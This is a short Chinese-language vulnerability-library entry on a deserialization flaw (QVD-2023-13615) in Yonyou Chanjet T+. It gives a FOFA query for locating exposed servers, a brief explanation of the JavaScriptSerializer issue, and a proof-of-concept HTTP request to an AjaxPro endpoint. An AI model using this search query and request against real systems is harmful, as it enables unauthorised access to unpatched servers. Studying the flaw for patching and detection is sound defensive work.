## 这里就是漏洞库了

### 用友畅捷通T
- fofa语法：`app="畅捷通-TPlus"`

#### 畅捷通T+ 反序列化漏洞（QVD-2023-13615）

该漏洞属于.net反序列化场景中的 JavaScriptSerializer反序列化；

简介：在.NET处理 Ajax应用的时候，通常序列化功能由JavaSerializer类提供，它是.NET2.0之后内部实现的序列化功能的类，位于命名空间System.Web..Serialization、通过System.Web.Extensions引用，让开发者轻松实现.Net中所有类型和Json数据之间的转换，但在某些场景下开发者使用Deserialize 或DeserializeObject方法处理不安全的Json数据时会造成反序列化攻击从而实现远程RCE漏洞。

- POC
    ```
    POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
    Host: your-ip
    X-Ajaxpro-Method: GetStoreWarehouseByStore
    
    {
    "storeID":{}
    }
    ```

- PS:`X-Ajaxpro-Method`：用于指定在Ajax请求中要调用的服务器端方法的名称

![Alt text](/images/QVD-2023-13615.png)

- [相关链接](https://blog.csdn.net/qq_41904294/article/details/131350965)